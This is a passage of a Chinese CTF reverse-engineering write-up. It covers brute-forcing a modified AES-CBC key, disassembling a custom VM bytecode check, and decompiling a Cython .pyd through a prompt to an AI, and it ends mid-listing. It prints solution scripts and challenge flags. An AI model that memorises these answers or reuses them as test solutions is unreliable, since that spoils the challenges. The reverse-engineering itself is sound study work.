    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
]

inv_s_box = [
    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D
]

# Rcon for key expansion
rcon = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]


def sub_word(word):
    return [s_box[b] for b in word]


def rot_word(word):
    return word[1:] + word[:1]


def key_expansion(key):
    key_bytes = list(key)
    w = [0] * 44 * 4
    for i in range(16):
        w[i] = key_bytes[i]

    for i in range(4, 44):
        temp = w[(i - 1) * 4: i * 4]
        if i % 4 == 0:
            temp = sub_word(rot_word(temp))
            temp[0] ^= rcon[i // 4]
        w[i * 4: (i + 1) * 4] = [w[(i - 4) * 4 + j] ^ temp[j] for j in range(4)]

    round_keys = []
    for i in range(11):
        round_keys.append(bytes(w[i * 16: i * 16 + 16]))
    return round_keys


def inv_shift_rows(state):
    state_list = list(state)
    s = [0] * 16

    # 基于正向变换推导逆变换
    s[0] = state_list[0] ^ 0xB7
    s[4] = (state_list[4] - 70) & 0xFF
    s[8] = state_list[8] ^ 0xD4
    s[12] = (state_list[12] + 41) & 0xFF
    s[5] = (state_list[1] - 29) & 0xFF
    s[9] = state_list[5] ^ 0x37
    s[13] = (state_list[9] + 113) & 0xFF
    s[1] = (state_list[13] + 7) & 0xFF
    s[10] = (state_list[2] - 91) & 0xFF
    s[14] = state_list[6] ^ 0xC3
    s[2] = state_list[10] ^ 0x0D
    s[6] = (state_list[14] + 107) & 0xFF
    s[15] = (state_list[3] - 78) & 0xFF
    s[3] = state_list[7] ^ 0x43
    s[7] = (state_list[11] - 36) & 0xFF
    s[11] = (state_list[15] - 125) & 0xFF

    return bytes(s)


def inv_sub_bytes(state):
    return bytes([inv_s_box[b] for b in state])


def gf_multiply(a, b):
    """GF(2^8) multiplication with irreducible polynomial x^8 + x^4 + x^3 + x + 1 (0x11B)"""
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        carry = a & 0x80
        a = (a << 1) & 0xFF
        if carry:
            a ^= 0x1B
        b >>= 1
    return p


def inv_mix_columns(state):
    state_arr = list(state)
    new_state = [0] * 16
    for i in range(4):
        col = state_arr[i * 4: i * 4 + 4]
        a0, a1, a2, a3 = col
        new_state[i * 4] = gf_multiply(0x0e, a0) ^ gf_multiply(0x0b, a1) ^ gf_multiply(0x0d, a2) ^ gf_multiply(0x09, a3)
        new_state[i * 4 + 1] = gf_multiply(0x09, a0) ^ gf_multiply(0x0e, a1) ^ gf_multiply(0x0b, a2) ^ gf_multiply(0x0d,
                                                                                                                   a3)
        new_state[i * 4 + 2] = gf_multiply(0x0d, a0) ^ gf_multiply(0x09, a1) ^ gf_multiply(0x0e, a2) ^ gf_multiply(0x0b,
                                                                                                                   a3)
        new_state[i * 4 + 3] = gf_multiply(0x0b, a0) ^ gf_multiply(0x0d, a1) ^ gf_multiply(0x09, a2) ^ gf_multiply(0x0e,
                                                                                                                   a3)
    return bytes(new_state)


def aes_decrypt_block(ciphertext, round_keys):
    state = ciphertext

    # 初始轮密钥加
    state = bytes([state[i] ^ round_keys[10][i] for i in range(16)])

    # 9轮完整解密
    for round in range(9, 0, -1):
        state = inv_shift_rows(state)
        state = inv_sub_bytes(state)
        state = bytes([state[i] ^ round_keys[round][i] for i in range(16)])
        state = inv_mix_columns(state)

    # 最后一轮（无MixColumns）
    state = inv_shift_rows(state)
    state = inv_sub_bytes(state)
    state = bytes([state[i] ^ round_keys[0][i] for i in range(16)])

    return state


def decrypt_cbc(ciphertext, key, iv):
    round_keys = key_expansion(key)
    blocks = [ciphertext[i:i + 16] for i in range(0, len(ciphertext), 16)]
    plaintext = b''
    prev = iv
    for block in blocks:
        decrypted = aes_decrypt_block(block, round_keys)
        plaintext += bytes([decrypted[i] ^ prev[i] for i in range(16)])
        prev = block
    return plaintext


def pkcs7_unpad(data):
    """PKCS7去填充"""
    if len(data) == 0:
        return data
    padding_len = data[-1]
    if padding_len > len(data):
        return data
    # 检查填充是否有效
    for i in range(1, padding_len + 1):
        if data[-i] != padding_len:
            return data
    return data[:-padding_len]


def main():
    target_cipher = bytes.fromhex(
        "b250062307bbe0216de2fe549c9a768ff67e1063c1e1dfb38265ded7610603514c3e3951c392f403cce40b5be0adf5c03cd1a8d035892c1b1b5f3579127a45e843d99b87b45d292fff75cb2332f1b59c")

    print("Starting brute force attack...")

    found = False
    for key_num in range(1000000):
        key_str = str(key_num).zfill(6)
        key_bytes = key_str.encode()
        hash_obj = hashlib.sha256(key_bytes)
        hash_bytes = hash_obj.digest()
        aes_key = hash_bytes[:16]
        iv = hash_bytes[16:32]

        try:
            plaintext = decrypt_cbc(target_cipher, aes_key, iv)
            plaintext = pkcs7_unpad(plaintext)

            # 更宽松的检查条件
            if len(plaintext) > 0:
                # 检查是否为可打印ASCII
                if all(32 <= b < 127 for b in plaintext):
                    text = plaintext.decode('ascii', errors='ignore')
                    if 'flag' in text.lower() or 'FLAG' in text:
                        print(f"Found potential key: {key_str}")
                        print(f"Plaintext: {plaintext}")
                        print(f"Decrypted: {text}")
                        found = True
                        break

                    # 也检查常见的CTF flag格式
                    if text.startswith('flag{') or text.startswith('FLAG{') or text.startswith('ctf{'):
                        print(f"Found key: {key_str}")
                        print(f"Plaintext: {plaintext}")
                        print(f"Decrypted: {text}")
                        found = True
                        break

        except Exception as e:
            pass

        if key_num % 10000 == 0:
            print(f"Tried {key_num} keys")

    if not found:
        print("Key not found in range 000000-999999")
        print("The issue might be in the decryption implementation.")
        print("Please verify the ShiftRows and MixColumns implementations.")


if __name__ == '__main__':
    main()

```

```
Found potential key: 810975
Plaintext: b'flag{r3v3Rs1Ng_7h3_H4rm0nY_05_1s_n07_4S_d1Ff1cUl7_45_y0U_7h1nK!}'
Decrypted: flag{r3v3Rs1Ng_7h3_H4rm0nY_05_1s_n07_4S_d1Ff1cUl7_45_y0U_7h1nK!}
```





## 天才的“认证”

pyc先反编译一下，这个多找几个网站试试（有的网站不行，有个网站换一个算法就行，不用那个pycdc

把字节码转出来

脚本

```
bytecode = b'\x01i\x032\x011\x033\x01A\x034\x01\t\x035\x01\xa1\x036\x01`\x037\x01\xa1\x038\x01\x81\x039\x011\x03:\x019\x03;\x01\x8b\x03<\x01!\x03=\x01\xd1\x03>\x019\x03?\x01 \x03@\x01\xb1\x03A\x01\xf9\x03B\x01\xd9\x03C\x01q\x03D\x01f\x03E\x01\x18\x03F\x01\x99\x03G\x01V\x03H\x01\xe9\x03I\x01q\x03J\x010\x03K\x01V\x03L\x018\x03M\x01\xa1\x03N\x01\xab\x03O\x01\x86\x03P\r\x01\x1f\t\n=\x01K\x03\x02\x01\x00\x03\x00\x02\x00\x01\x1f\t\x0b+\x01\x10\x02\x00\x04\x0e\x02\x00\x04\x02\x02\x05\x03\x01\x02\x01\x01\x03\x06\x02\x01\x01\x05\x07\x08\x012\x02\x00\x04\x0e\t\n\x0c\x02\x00\x01\x01\x04\x03\x00\x0c\xce\x01\x01\xff\x01\x00\xff'

opcodes = {
    1: "PUSH_IMM",
    2: "PUSH_MEM",
    3: "POP_MEM",
    4: "ADD",
    5: "XOR",
    6: "SHL",
    7: "SHR",
    8: "OR",
    9: "CMP",
    10: "JMP_IF_FALSE",
    11: "JMP_IF_TRUE",
    12: "JMP",
    13: "PUSH_LEN",
    14: "PUSH_INDIRECT",
    15: "POP_INDIRECT",
    255: "HALT"
}

ip = 0
output = []
while ip < len(bytecode):
    op = bytecode[ip]
    ip += 1
    if op in opcodes:
        name = opcodes[op]
        if op in [1,2,3,10,11,12]:
            if ip < len(bytecode):
                arg = bytecode[ip]
                ip += 1
                output.append(f"{ip-2:03d}: {name} {arg}")
            else:
                output.append(f"{ip-1:03d}: {name} [missing arg]")
        else:
            output.append(f"{ip-1:03d}: {name}")
    else:
        output.append(f"{ip-1:03d}: UNKNOWN {op}")

for line in output:
    print(line)
```

输出

```
000: PUSH_IMM 105
002: POP_MEM 50
004: PUSH_IMM 49
006: POP_MEM 51
008: PUSH_IMM 65
010: POP_MEM 52
012: PUSH_IMM 9
014: POP_MEM 53
016: PUSH_IMM 161
018: POP_MEM 54
020: PUSH_IMM 96
022: POP_MEM 55
024: PUSH_IMM 161
026: POP_MEM 56
028: PUSH_IMM 129
030: POP_MEM 57
032: PUSH_IMM 49
034: POP_MEM 58
036: PUSH_IMM 57
038: POP_MEM 59
040: PUSH_IMM 139
042: POP_MEM 60
044: PUSH_IMM 33
046: POP_MEM 61
048: PUSH_IMM 209
050: POP_MEM 62
052: PUSH_IMM 57
054: POP_MEM 63
056: PUSH_IMM 32
058: POP_MEM 64
060: PUSH_IMM 177
062: POP_MEM 65
064: PUSH_IMM 249
066: POP_MEM 66
068: PUSH_IMM 217
070: POP_MEM 67
072: PUSH_IMM 113
074: POP_MEM 68
076: PUSH_IMM 102
078: POP_MEM 69
080: PUSH_IMM 24
082: POP_MEM 70
084: PUSH_IMM 153
086: POP_MEM 71
088: PUSH_IMM 86
090: POP_MEM 72
092: PUSH_IMM 233
094: POP_MEM 73
096: PUSH_IMM 113
098: POP_MEM 74
100: PUSH_IMM 48
102: POP_MEM 75
104: PUSH_IMM 86
106: POP_MEM 76
108: PUSH_IMM 56
110: POP_MEM 77
112: PUSH_IMM 161
114: POP_MEM 78
116: PUSH_IMM 171
118: POP_MEM 79
120: PUSH_IMM 134
122: POP_MEM 80
124: PUSH_LEN
125: PUSH_IMM 31
127: CMP
128: JMP_IF_FALSE 61
130: PUSH_IMM 75
132: POP_MEM 2
134: PUSH_IMM 0
136: POP_MEM 0
138: PUSH_MEM 0
140: PUSH_IMM 31
142: CMP
143: JMP_IF_TRUE 43
145: PUSH_IMM 16
147: PUSH_MEM 0
149: ADD
150: PUSH_INDIRECT
151: PUSH_MEM 0
153: ADD
154: PUSH_MEM 2
156: XOR
157: POP_MEM 1
159: PUSH_MEM 1
161: PUSH_IMM 3
163: SHL
164: PUSH_MEM 1
166: PUSH_IMM 5
168: SHR
169: OR
170: PUSH_IMM 50
172: PUSH_MEM 0
174: ADD
175: PUSH_INDIRECT
176: CMP
177: JMP_IF_FALSE 12
179: PUSH_MEM 0
181: PUSH_IMM 1
183: ADD
184: POP_MEM 0
186: JMP 206
188: PUSH_IMM 1
190: HALT
191: PUSH_IMM 0
193: HALT
```

到这里就很简单了，智能机器看一眼就解决了（

```
def decrypt_flag():
    encrypted = [
        105, 49, 65, 9, 161, 96, 161, 129, 49, 57,
        139, 33, 209, 57, 32, 177, 249, 217, 113, 102,
        24, 153, 86, 233, 113, 48, 86, 56, 161, 171,
        134
    ]
    flag = ''
    for i in range(31):
        c = encrypted[i]
        tmp = (c >> 3) | ((c << 5) & 0xFF)
        x = tmp ^ 75
        char_code = (x - i) % 256
        flag += chr(char_code)
    return flag

if __name__ == '__main__':
    flag = decrypt_flag()
    print(flag)
```



## 河图洛书

开始主要问题应该是找不到luoshu（

看到pyd不知道是什么查了一下，然后自己调用了一下发现这就是洛书，然后就ida看了，当然这么长的东西人来看简直是折磨（

下面是prompt（可能要多试几次？因为有点长了。。）

````
CTF的reverse题，给出了一个python打包的exe文件，解压后发现关键点在于一个pyd文件，通过ida分析得到了这一段 __int64 __fastcall sub_180001000(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4) {  _QWORD *v5; // r9  __int64 v6; // r13  __int64 v7; // rbx  __int64 v8; // r14  _DWORD *v9; // rax  _DWORD *v10; // rax  _DWORD *v11; // rax  _DWORD *v12; // rax  int v13; // eax  __int64 v14; // rcx  int v15; // r8d  int v16; // r9d  __int64 v17; // rsi  _QWORD *v18; // r12  _QWORD **v19; // rdi  _DWORD *ItemWithError; // rax  _DWORD *v21; // rcx  _DWORD *v22; // rax  _DWORD *v23; // rax  _DWORD *v24; // rax  __int64 v25; // rbx  int v26; // edi  __int64 v27; // rcx  bool v28; // zf  __int64 v29; // rcx  __int64 v30; // rcx  __int64 v31; // rcx  __int64 v33; // r8  const char *v34; // rax  const char *v35; // r8  __int64 v36; // r8  __int64 v37; // rax  __int64 v38; // rcx  __int64 v39; // rcx  __int64 v40; // rcx  _QWORD *v41; // rcx  bool v42; // sf  __int64 v43; // rcx  __int64 v44; // rcx  __int64 v45; // rcx  __int128 v46; // [rsp+50h] [rbp-29h] BYREF  __int128 v47; // [rsp+60h] [rbp-19h]  _QWORD v48[5]; // [rsp+70h] [rbp-9h] BYREF   v48[0] = &qword_18000ADC0;  v5 = &a2[a3];  v6 = 0LL;  v48[1] = &qword_18000ADC8;  v48[2] = &qword_18000AD98;  v48[3] = &qword_18000AD88;  v48[4] = 0LL;  v7 = a3;  v46 = 0LL;  v47 = 0LL;  if ( !a4 )    goto LABEL_42;  v8 = *(_QWORD *)(a4 + 16);  if ( v8 < 0 )    goto LABEL_55;  if ( v8 <= 0 )  { LABEL_42:    if ( a3 == 4 )    {      v21 = (_DWORD *)*a2;      if ( *(_DWORD *)*a2 != -1 )        *v21 = *(_DWORD *)*a2 + 1;      v22 = (_DWORD *)a2[1];      *(_QWORD *)&v46 = v21;      if ( *v22 != -1 )        ++*v22;      *((_QWORD *)&v46 + 1) = v22;      v23 = (_DWORD *)a2[2];      if ( *v23 != -1 )        ++*v23;      *(_QWORD *)&v47 = v23;      v24 = (_DWORD *)a2[3];      if ( *v24 != -1 )        ++*v24;      *((_QWORD *)&v47 + 1) = v24;      goto LABEL_53;    }    goto LABEL_43;  }  if ( !a3 )    goto LABEL_21;  if ( a3 != 1 )  {    switch ( a3 )    {      case 2LL: LABEL_15:        v11 = (_DWORD *)a2[1];        if ( *v11 != -1 )          ++*v11;        *((_QWORD *)&v46 + 1) = v11;        goto LABEL_18;      case 3LL: LABEL_12:        v10 = (_DWORD *)a2[2];        if ( *v10 != -1 )          ++*v10;        *(_QWORD *)&v47 = v10;        goto LABEL_15;      case 4LL:        v9 = (_DWORD *)a2[3];        if ( *v9 != -1 )          ++*v9;        *((_QWORD *)&v47 + 1) = v9;        goto LABEL_12;    } LABEL_43:    PyErr_Format(      PyExc_TypeError,      "%.200s() takes %.8s %zd positional argument%.1s (%zd given)",      "encrypt",      "exactly",      4uLL,      "s",      a3);    goto LABEL_55;  } LABEL_18:  v12 = (_DWORD *)*a2;  if ( *(_DWORD *)*a2 != -1 )    *v12 = *(_DWORD *)*a2 + 1;  *(_QWORD *)&v46 = v12; LABEL_21:  if ( (*(_DWORD *)(*(_QWORD *)(a4 + 8) + 168LL) & 0x4000000) != 0 )  {    v13 = sub_180002C70(a4, (_DWORD)v5, (unsigned int)v48, (_DWORD)v5, (__int64)&v46, a3, v8);    goto LABEL_36;  }  v17 = 0LL;  v18 = &v48[a3];  if ( !(unsigned int)PyArg_ValidateKeywordArguments(a4, a2, a3, v5) )    goto LABEL_35;  v19 = (_QWORD **)v18;  if ( !*v18 )  { LABEL_34:    sub_180002A80(a4, v48, v18); LABEL_35:    v13 = -1;    goto LABEL_36;  }  while ( v8 > v17 )  {    ItemWithError = (_DWORD *)PyDict_GetItemWithError(a4, **v19);    if ( ItemWithError )    {      if ( *ItemWithError != -1 )        ++*ItemWithError;      a2 = v48;      v14 = v19 - (_QWORD **)v48;      ++v17;      *((_QWORD *)&v46 + v14) = ItemWithError;    }    else if ( PyErr_Occurred() )    {      goto LABEL_35;    }    if ( !*++v19 )    {      if ( v8 > v17 )        goto LABEL_34;      break;    }  }  v13 = 0; LABEL_36:  if ( v13 >= 0 )  {    if ( v7 < 4 )    {      while ( *((_QWORD *)&v46 + v7) )      {        if ( ++v7 >= 4 )          goto LABEL_53;      }      sub_180002EC0(v14, (_DWORD)a2, v15, v16, v7);      goto LABEL_55;    } LABEL_53:    v25 = v46;    v26 = sub_180004870(*((_QWORD *)&v46 + 1));    if ( v26 == -1 && PyErr_Occurred() )      goto LABEL_55;    if ( v25 == Py_NoneStruct || (v33 = *(_QWORD *)(v25 + 8), v33 == PyBytes_Type) )    {      if ( (_QWORD)v47 == Py_NoneStruct || (v36 = *(_QWORD *)(v47 + 8), v36 == PyBytes_Type) )      {        if ( *((_QWORD *)&v47 + 1) == Py_NoneStruct          || (v37 = *(_QWORD *)(*((_QWORD *)&v47 + 1) + 8LL), v37 == PyBytes_Type) )        {          v6 = sub_180001510(DWORD2(v47), v25, v26, v47, *((__int64 *)&v47 + 1));          v43 = v46;          if ( (_QWORD)v46 )          {            if ( *(int *)v46 >= 0 )            {              v28 = (*(_QWORD *)v46)-- == 1LL;              if ( v28 )                Py_Dealloc(v43);            }          }          v44 = *((_QWORD *)&v46 + 1);          if ( *((_QWORD *)&v46 + 1) )          {            if ( (int)**((_DWORD **)&v46 + 1) >= 0 )            {              v28 = (**((_QWORD **)&v46 + 1))-- == 1LL;              if ( v28 )                Py_Dealloc(v44);            }          }          v45 = v47;          if ( (_QWORD)v47 )          {            if ( *(int *)v47 >= 0 )            {              v28 = (*(_QWORD *)v47)-- == 1LL;              if ( v28 )                Py_Dealloc(v45);            }          }          v41 = (_QWORD *)*((_QWORD *)&v47 + 1);          if ( !*((_QWORD *)&v47 + 1) )            return v6;          v42 = (int)**((_DWORD **)&v47 + 1) < 0;          goto LABEL_114;        }        if ( !PyBytes_Type )          goto LABEL_75;        v34 = *(const char **)(v37 + 24);        v35 = "iv";      }      else      {        if ( !PyBytes_Type )          goto LABEL_75;        v34 = *(const char **)(v36 + 24);        v35 = "key";      }    }    else    {      if ( !PyBytes_Type )      { LABEL_75:        PyErr_SetString(PyExc_SystemError, "Missing type object");        goto LABEL_86;      }      v34 = *(const char **)(v33 + 24);      v35 = "message";    }    PyErr_Format(      PyExc_TypeError,      "Argument '%.200s' has incorrect type (expected %.200s, got %.200s)",      v35,      *((const char **)&PyBytes_Type + 3),      v34); LABEL_86:    v38 = v46;    if ( (_QWORD)v46 )    {      if ( *(int *)v46 >= 0 )      {        v28 = (*(_QWORD *)v46)-- == 1LL;        if ( v28 )          Py_Dealloc(v38);      }    }    v39 = *((_QWORD *)&v46 + 1);    if ( *((_QWORD *)&v46 + 1) )    {      if ( (int)**((_DWORD **)&v46 + 1) >= 0 )      {        v28 = (**((_QWORD **)&v46 + 1))-- == 1LL;        if ( v28 )          Py_Dealloc(v39);      }    }    v40 = v47;    if ( (_QWORD)v47 )    {      if ( *(int *)v47 >= 0 )      {        v28 = (*(_QWORD *)v47)-- == 1LL;        if ( v28 )          Py_Dealloc(v40);      }    }    v41 = (_QWORD *)*((_QWORD *)&v47 + 1);    if ( !*((_QWORD *)&v47 + 1) )      return v6;    v42 = (int)**((_DWORD **)&v47 + 1) < 0; LABEL_114:    if ( !v42 )    {      v28 = (*v41)-- == 1LL;      if ( v28 )        Py_Dealloc(v41);    }    return v6;  } LABEL_55:  v27 = v46;  if ( (_QWORD)v46 )  {    if ( *(int *)v46 >= 0 )    {      v28 = (*(_QWORD *)v46)-- == 1LL;      if ( v28 )        Py_Dealloc(v27);    }  }  v29 = *((_QWORD *)&v46 + 1);  if ( *((_QWORD *)&v46 + 1) )  {    if ( (int)**((_DWORD **)&v46 + 1) >= 0 )    {      v28 = (**((_QWORD **)&v46 + 1))-- == 1LL;      if ( v28 )        Py_Dealloc(v29);    }  }  v30 = v47;  if ( (_QWORD)v47 )  {    if ( *(int *)v47 >= 0 )    {      v28 = (*(_QWORD *)v47)-- == 1LL;      if ( v28 )        Py_Dealloc(v30);    }  }  v31 = *((_QWORD *)&v47 + 1);  if ( *((_QWORD *)&v47 + 1) && (int)**((_DWORD **)&v47 + 1) >= 0 )  {    v28 = (**((_QWORD **)&v47 + 1))-- == 1LL;    if ( v28 )      Py_Dealloc(v31);  }  sub_180004680("luo_shu.encrypt", a2, 18LL, "luo_shu.pyx");  return 0LL; } 下一步需要干什么？我需要得到luo_shu.encrypt函数的具体实现和解密的完整思路 运行 import luo_shu help(luo_shu) 得到 Help on module luo_shu: NAME    luo_shu FUNCTIONS    encrypt(message, mode, key, iv) DATA    __test__ = {} FILE    d:\ctf比赛\newstar2025\re\[re] 河圖洛書_rvg\河圖洛書_rvg.exe_extracted\luo_shu.pyd __int64 __fastcall sub_180001510(__int64 a1, __int64 a2, unsigned int a3, __int64 a4, __int64 a5) {  __int64 v5; // r10  unsigned int v8; // ebx  __int64 v9; // rbp  unsigned int v10; // edx  unsigned int v11; // r14d  unsigned int v12; // r9d  int v13; // r14d  char *v14; // rax  char *v15; // rbx  signed __int64 v16; // r8  signed __int64 v17; // r8  __int64 v18; // rdi  __int64 v19; // rax  int **v20; // rcx  int *v21; // r14  _DWORD *v22; // r13  _DWORD *v23; // r15  bool v24; // zf  _DWORD **v25; // r12  _DWORD *v26; // rsi  int *v27; // rdi  int *Traceback; // rax  int v29; // eax  void **v30; // rax  void *v31; // rcx  int **v32; // rax  int *v33; // rcx  int *v34; // rcx  __int64 v36; // [rsp+20h] [rbp-238h]  void *Block; // [rsp+28h] [rbp-230h]  _BYTE v39[432]; // [rsp+40h] [rbp-218h] BYREF  void *Src; // [rsp+1F0h] [rbp-68h] BYREF  char v41; // [rsp+1F8h] [rbp-60h]  __int64 v42; // [rsp+200h] [rbp-58h] BYREF  char v43; // [rsp+208h] [rbp-50h]   v5 = Py_NoneStruct;  if ( a2 == Py_NoneStruct )  {    PyErr_SetString(PyExc_TypeError, "object of type 'NoneType' has no len()"); LABEL_3:    v8 = 19; LABEL_104:    sub_180004680("luo_shu.encrypt", a2, v8, "luo_shu.pyx");    return 0LL;  }  v9 = *(_QWORD *)(a2 + 16);  if ( v9 == -1 )    goto LABEL_3;  v10 = 0;  if ( (int)v9 % 9 )    v10 = (unsigned int)((int)v9 % 9) >> 31;  v11 = 0;  v12 = (int)(9 - 9 * v10 - (int)v9 % 9) % 9;  if ( v12 )    v11 = v12 >> 31;  v13 = v12 + 8 * v11 + v11;  Src = (void *)(a2 + 32);  if ( a2 == -32 )  {    if ( PyErr_Occurred() )    {      v8 = 32;      goto LABEL_104;    }    v5 = Py_NoneStruct;  }  if ( a4 == v5 )  {    PyErr_SetString(PyExc_TypeError, "expected bytes, NoneType found"); LABEL_15:    v8 = 33;    goto LABEL_104;  }  if ( a4 == -32 )  {    if ( PyErr_Occurred() )      goto LABEL_15;    v5 = Py_NoneStruct;  }  if ( a5 == v5 )  {    PyErr_SetString(PyExc_TypeError, "expected bytes, NoneType found"); LABEL_21:    v8 = 34;    goto LABEL_104;  }  if ( a5 == -32 && PyErr_Occurred() )    goto LABEL_21;  v14 = (char *)malloc(v13 + (int)v9);  Block = v14;  v15 = v14;  if ( !v14 )  {    PyErr_NoMemory();    v8 = 38;    goto LABEL_104;  }  memcpy(v14, Src, (int)v9);  if ( v13 > 0 )    memset(&v15[(int)v9], (unsigned __int8)v13, v13);  v42 = 0LL;  v43 = 0;  Src = 0LL;  v41 = 0;  if ( a4 == Py_NoneStruct )  {    PyErr_SetString(PyExc_TypeError, "object of type 'NoneType' has no len()");    v8 = 52;    goto LABEL_42;  }  v16 = *(_QWORD *)(a4 + 16);  if ( v16 == -1 )  {    v8 = 52;    goto LABEL_42;  }  if ( v16 > 9 )    v16 = 9LL;  memcpy(&v42, (const void *)(a4 + 32), v16);  if ( a5 == Py_NoneStruct )  {    PyErr_SetString(PyExc_TypeError, "object of type 'NoneType' has no len()");    v8 = 53;    goto LABEL_42;  }  v17 = *(_QWORD *)(a5 + 16);  if ( v17 == -1 )  {    v8 = 53;    goto LABEL_42;  }  if ( v17 > 9 )    v17 = 9LL;  memcpy(&Src, (const void *)(a5 + 32), v17);  sub_1800050E0(v39, &v42, &Src, a3);  sub_1800052A0(v39, v15, (unsigned int)v9);  v18 = PyBytes_FromStringAndSize(v15, v13 + (int)v9);  if ( !v18 )  {    v8 = 60; LABEL_42:    v19 = PyThreadState_UncheckedGet();    v36 = v19;    v20 = *(int ***)(v19 + 104);    v21 = *v20;    *v20 = 0LL;    if ( v21 )    {      if ( v21 != (int *)Py_NoneStruct )      {        v22 = (_DWORD *)*((_QWORD *)v21 + 1);        if ( *v22 != -1 )          ++*v22;        v23 = (_DWORD *)*((_QWORD *)v21 + 5);        if ( v23 && *v23 != -1 )          ++*v23;        goto LABEL_54;      }      if ( *v21 >= 0 )      {        v24 = (*(_QWORD *)v21)-- == 1LL;        if ( v24 )          Py_Dealloc(v21);        v19 = v36;      }    }    v21 = 0LL;    v22 = 0LL;    v23 = 0LL; LABEL_54:    v25 = *(_DWORD ***)(v19 + 96);    v26 = 0LL;    v27 = 0LL;    *(_QWORD *)(v19 + 96) = 0LL;    if ( v25 )    {      v26 = v25[1];      if ( *v26 != -1 )        ++*v26;      Traceback = (int *)PyException_GetTraceback(v25);      v27 = Traceback;      if ( Traceback )      {        v29 = *Traceback + 1;        if ( v29 )          *v27 = v29;      }      if ( *v26 != -1 )        ++*v26;      if ( *(_DWORD *)v25 != -1 )        ++*(_DWORD *)v25;      v19 = v36;    }    v30 = *(void ***)(v19 + 104);    Src = *v30;    *v30 = v25;    if ( v26 )    {      if ( (int)*v26 >= 0 )      {        v24 = (*(_QWORD *)v26)-- == 1LL;        if ( v24 )          Py_Dealloc(v26);      }    }    if ( v27 )    {      if ( *v27 >= 0 )      {        v24 = (*(_QWORD *)v27)-- == 1LL;        if ( v24 )          Py_Dealloc(v27);      }    }    v31 = Src;    if ( Src )    {      if ( *(int *)Src >= 0 )      {        v24 = (*(_QWORD *)Src)-- == 1LL;        if ( v24 )          Py_Dealloc(v31);      }    }    free(Block);    v32 = *(int ***)(v36 + 104);    v33 = *v32;    *v32 = v21;    if ( v33 )    {      if ( *v33 >= 0 )      {        v24 = (*(_QWORD *)v33)-- == 1LL;        if ( v24 )          Py_Dealloc(v33);      }    }    if ( v22 )    {      if ( (int)*v22 >= 0 )      {        v24 = (*(_QWORD *)v22)-- == 1LL;        if ( v24 )          Py_Dealloc(v22);      }    }    if ( v23 )    {      if ( (int)*v23 >= 0 )      {        v24 = (*(_QWORD *)v23)-- == 1LL;        if ( v24 )          Py_Dealloc(v23);      }    }    if ( v25 && v25[5] != v27 )      PyException_SetTraceback(v25, v27);    v34 = *(int **)(v36 + 96);    *(_QWORD *)(v36 + 96) = v25;    if ( v34 )    {      if ( *v34 >= 0 